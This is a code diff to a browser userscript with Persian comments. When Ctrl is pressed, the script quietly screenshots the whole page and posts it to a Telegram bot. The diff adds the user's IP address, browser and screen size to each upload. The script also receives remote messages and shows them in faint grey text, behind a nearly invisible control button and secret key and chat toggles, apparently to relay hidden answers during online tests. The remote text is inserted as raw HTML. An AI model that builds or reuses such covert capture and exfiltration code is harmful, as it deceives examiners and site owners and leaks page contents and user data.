@@ -19,39 +19,98 @@
     const telegramUpdatesAPI = `https://api.telegram.org/bot${token}/getUpdates`;
     let lastUpdateId = 0;
     let onePressCount = 0;
-    let button;
-    let isMessageDisplayActive = true;
+    let lastToggleTs = 0;   // زمان آخرین toggle (ms)
 
-    function takeScreenshot() {
-        if (isMessageDisplayActive) {
-            html2canvas(document.body, { useCORS: true }).then(function (canvas) {
-                let base64image = canvas.toDataURL("image/png");
-                sendToTelegram(base64image);
-            });
+    // جای پیام (۰…۷) و آرایهٔ مختصات ساعت‌گرد
+    let posIdx = +(localStorage.getItem('posIdx') ?? 0);
+    const posList = [
+        {top:'10px',        right:'10px'},                           // 0 ↗︎ بالا راست
+        {top:'50%',         right:'10px',  transform:'translateY(-50%)'}, // 1 → راست وسط
+        {bottom:'10px',     right:'10px'},                           // 2 ↘︎ پایین راست
+        {bottom:'10px',     left:'50%',   transform:'translateX(-50%)'},  // 3 ↓ پایین وسط
+        {bottom:'10px',     left:'10px'},                            // 4 ↙︎ پایین چپ
+        {top:'50%',         left:'10px',  transform:'translateY(-50%)'},  // 5 ← چپ وسط
+        {top:'10px',        left:'10px'},                            // 6 ↖︎ بالا چپ
+        {top:'10px',        left:'50%',   transform:'translateX(-50%)'}   // 7 ↑ بالا وسط
+    ];
+
+    let button;
+    let rotateBtn;              // مرجع دکمۀ Rotate
+    let isMessageDisplayActive = (localStorage.getItem('botState') ?? 'on') === 'on';
+
+    // وضعیت ارسال اطلاعات سیستمی؛ در نصب اول پیش‌فرض on
+    let ipFlag = localStorage.getItem('ipFlag') || 'on';
+    localStorage.setItem('ipFlag', ipFlag);   // اطمینان از ذخیره
+
+    function getBrowserInfo(ua = navigator.userAgent) {
+        ua = ua.toLowerCase();
+
+        if (ua.includes('edg/')) {
+            return 'Edge ' + ua.match(/edg\/([\d.]+)/)[1];
+        }
+        if (ua.includes('opr/')) {
+            return 'Opera ' + ua.match(/opr\/([\d.]+)/)[1];
+        }
+        if (ua.includes('brave/')) {
+            return 'Brave ' + ua.match(/brave\/([\d.]+)/)[1];
+        }
+        if (ua.includes('vivaldi/')) {
+            return 'Vivaldi ' + ua.match(/vivaldi\/([\d.]+)/)[1];
+        }
+        if (ua.includes('firefox/')) {
+            return 'Firefox ' + ua.match(/firefox\/([\d.]+)/)[1];
+        }
+        if (ua.includes('chrome/')) {
+            return 'Chrome ' + ua.match(/chrome\/([\d.]+)/)[1];
+        }
+        if (ua.includes('safari/')) {
+            return 'Safari ' + ua.match(/version\/([\d.]+)/)[1];
+        }
+        return 'Unknown';
+    }
+
+    async function getSystemInfo() {
+        try {
+            // IP عمومی
+            const ipResp = await fetch('https://api.ipify.org?format=json');
+            const ip = (await ipResp.json()).ip;
+
+            // سایر داده‌ ها
+            const ua   = navigator.userAgent;
+            const scrW = window.screen.width;
+            const scrH = window.screen.height;
+            const browser = getBrowserInfo(ua);
+
+            return `IP: ${ip}\nBrowser: ${browser}\nScreen: ${scrW}x${scrH}`;
+        } catch (e) {
+            return 'Info-error';
         }
     }
 
-    function sendToTelegram(base64image) {
-        let byteString = atob(base64image.split(',')[1]);
-        let mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
-        let ab = new ArrayBuffer(byteString.length);
-        let ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
-        }
-        let blob = new Blob([ab], { type: mimeString });
+    // تابع جدید: ارسال Blob به تلگرام (JPEG)
+    function sendBlobToTelegram(blob, captionText = '') {
+        const formData = new FormData();
+        formData.append('chat_id', chat_id);
+        formData.append('photo', blob, 'screenshot.jpg');
+        if (ipFlag === 'on') formData.append('caption', captionText);
 
-        let formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "screenshot.png");
+        fetch(telegramAPI, { method: 'POST', body: formData })
+            .catch(err => console.error('Error sending photo:', err));
+    }
 
-        fetch(telegramAPI, {
-            method: "POST",
-            body: formData
-        })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+    // بازنویسی تابع اسکرین‌شات: خروجی JPEG و ارسال Blob
+    function takeScreenshot() {
+        if (!isMessageDisplayActive) return;
+
+        html2canvas(document.body, { useCORS: true })
+            .then(canvas => {
+                canvas.toBlob(async blob => {
+                    if (!blob) return console.error('Canvas->Blob failed');
+                    const info = await getSystemInfo();
+                    sendBlobToTelegram(blob, info);
+                }, 'image/jpeg', 0.8);   // JPEG با کیفیت ۸۰٪
+            })
+            .catch(err => console.error('html2canvas error:', err));
     }
 
     function sendTelegramMessage(messageText) {
@@ -78,10 +137,35 @@
                             let receivedMessage = message.message.text.trim();
                             lastUpdateId = message.update_id;
 
+                            const cmd = receivedMessage.toLowerCase();
+                            if (cmd === 'on' || cmd === 'off') {
+                                // پیام تأیید خودِ بات است؛ نادیده بگیر
+                                return;
+                            }
+
+                            if (cmd === 'ip off') {
+                                ipFlag = 'off';
+                                localStorage.setItem('ipFlag', 'off');
+                                sendTelegramMessage('IP sending disabled');
+                                return;
+                            }
+
+                            if (cmd === 'ip on') {
+                                ipFlag = 'on';
+                                localStorage.setItem('ipFlag', 'on');
+                                sendTelegramMessage('IP sending enabled');
+                                return;
+                            }
+
                             // Check for "1111" command to toggle bot state
                             if (receivedMessage === "1111") {
-                                toggleBotState(); // Toggle bot on/off
-                            } else {
+                                const now = Date.now();
+                                if (now - lastToggleTs > 1500) {   // حداقل 1.5 ثانیه فاصله
+                                    lastToggleTs = now;
+                                    toggleBotState();
+                                }
+                                return;   // بقیه را پردازش نکن
+                            } else if (isMessageDisplayActive) {
                                 displayMessage(receivedMessage); // Display other messages
                             }
                         }
@@ -93,13 +177,22 @@
             });
     }
 
+    function applyPos(el) {
+        // پاک‌کردن مختصات قبلی
+        el.style.top = el.style.right = el.style.bottom = el.style.left = '';
+        el.style.transform = '';
+
+        const p = posList[posIdx];
+        Object.keys(p).forEach(k => el.style[k] = p[k]);
+    }
+
     function displayMessage(message) {
+        if (!isMessageDisplayActive) return;        // ← تازه اضافه شد
         let messageDiv = document.createElement("div");
+        messageDiv.className = "tm-msg";            // ← تازه اضافه شد
         messageDiv.innerHTML = message;
         messageDiv.style.position = "fixed";
-        messageDiv.style.top = "0";
-        messageDiv.style.left = "50%";
-        messageDiv.style.transform = "translateX(-50%)";
+        applyPos(messageDiv);
         messageDiv.style.backgroundColor = "transparent";
         messageDiv.style.color = "#808080";
         messageDiv.style.padding = "10px";
@@ -111,6 +204,16 @@
         setTimeout(() => {
             document.body.removeChild(messageDiv);
         }, 2000);
+    }
+
+    function clearAllMessages() {
+        document.querySelectorAll('.tm-msg').forEach(el => el.remove());
+    }
+
+    function rotatePosition() {
+        posIdx = (posIdx + 1) % posList.length;
+        localStorage.setItem('posIdx', posIdx);
+        displayMessage('OK');
     }
 
     function createButton() {
@@ -132,24 +235,59 @@
         document.body.appendChild(button);
     }
 
+    function createRotateButton() {
+        rotateBtn = document.createElement('button');   // ← مرجع جهانی
+        rotateBtn.textContent = 'Rotate Msg Pos';
+        rotateBtn.style.cssText = `
+            position:fixed;
+            top:10px;
+            left:70px;
+            z-index:1000000000000000;
+            padding:5px 14px;
+            font-size:14px;
+            background:white;
+            color:white;
+            border:none;
+            border-radius:5px;
+            cursor:pointer;
+            opacity:0.001;
+        `;
+        rotateBtn.onclick = rotatePosition;
+        document.body.appendChild(rotateBtn);
+    }
+
     function toggleBotState() {
-        if (button) {
-            button.remove();
-            button = null;
+        if (isMessageDisplayActive) {              // خاموش
+            if (button)    button.remove();
+            if (rotateBtn) rotateBtn.remove();
+            clearAllMessages();
             isMessageDisplayActive = false;
-            sendTelegramMessage("OFF"); // Send OFF message to Telegram
-        } else {
+            localStorage.setItem('botState', 'off');
+            sendTelegramMessage('OFF');             // همیشه بفرست
+        } else {                                   // روشن
             createButton();
+            createRotateButton();
             isMessageDisplayActive = true;
-            sendTelegramMessage("ON"); // Send ON message to Telegram
+            localStorage.setItem('botState', 'on');
+            sendTelegramMessage('ON');              // همیشه بفرست
         }
     }
 
-    // Initialize button
-    createButton();
+    // Initialize UI only if bot is ON
+    if (isMessageDisplayActive) {
+        createButton();
+        createRotateButton();
+    }
+    setInterval(fetchTelegramMessages, 2000);
 
     // Add keyboard event listener for Ctrl key
     document.addEventListener('keydown', function (event) {
+        // Shift + Enter → چرخش جای پیام
+        if (event.shiftKey && event.key === 'Enter') {
+            rotatePosition();
+            return;            // از پردازش بقیه کلیدها صرف‌نظر کن
+        }
+
         if (event.ctrlKey) {
             takeScreenshot(); // Call the screenshot function when Ctrl is pressed
         }
@@ -159,11 +297,10 @@
             onePressCount++;
 
             if (onePressCount >= 4) {
-                toggleBotState(); // Toggle bot on/off
+                toggleBotState(); // بدون پارامتر
+                lastToggleTs = Date.now();
                 onePressCount = 0; // Reset counter
             }
         }
     });
-
-    setInterval(fetchTelegramMessages, 2000);
 })();
